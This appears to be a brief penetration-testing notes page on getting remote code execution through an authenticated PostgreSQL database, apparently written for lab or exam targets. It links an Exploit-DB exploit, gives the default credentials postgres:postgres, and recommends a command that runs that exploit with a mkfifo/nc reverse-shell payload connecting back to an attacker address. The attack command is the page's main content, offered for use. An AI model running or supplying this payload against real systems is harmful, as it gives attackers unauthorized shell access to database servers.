# Authenticated PostgresSQL

If we have valid credentials for a PostgresSQL DB&#x20;

We should follow this article on RCE.

As well as using this exploit if the versions match

{% embed url="https://www.exploit-db.com/exploits/50847" %}

The default cred are postgres:postgres

Depending on which system we are tareting I recommend using this payload for getting a reverse shell out of this.&#x20;

```
python /usr/share/exploitdb/exploits/multiple/remote/50847.py -i 192.168.143.47 -p 5437 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.49.143 80 >/tmp/f'
